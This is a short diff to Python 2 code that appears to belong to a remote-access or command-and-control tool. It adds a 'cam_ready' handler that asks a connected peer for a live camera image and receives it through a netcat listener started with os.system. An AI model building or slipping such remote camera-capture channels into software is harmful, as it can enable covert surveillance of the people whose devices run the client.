@@ -291,6 +291,24 @@ def listen_alt_channel(timeout):
                 cipher = AES.new(base64.b64decode(raw_data.split(' ???? ')[0]))
                 decrypted_query = utils.DecodeAES(cipher, raw_data.split(' ???? ')[1])
 
+                if decrypted_query == 'cam_ready':
+                    # Get New Live Feed Image
+                    k = raw_data.split(' ???? ')[0]
+                    c = AES.new(base64.b64decode(k))
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((client_addr[0], 56234))
+                        s.send(k+' ???? '+utils.EncodeAES(c, 'GET'))
+                        os.system('nc -l 42024 >> im.jpeg')
+                        if os.path.isfile('im.jpeg'):
+                            isize = os.path.getsize('im.jpeg')
+                            print '[*] New Live Feed Image Uploaded [%d bytes]' % isize
+                        s.close()
+                        client.close()
+                    except socket.error:
+                        client.close()
+                        pass
+
                 # Display peer names command
                 client = QueryApi.show_peers(client, clients, raw_data, decrypted_query)
 
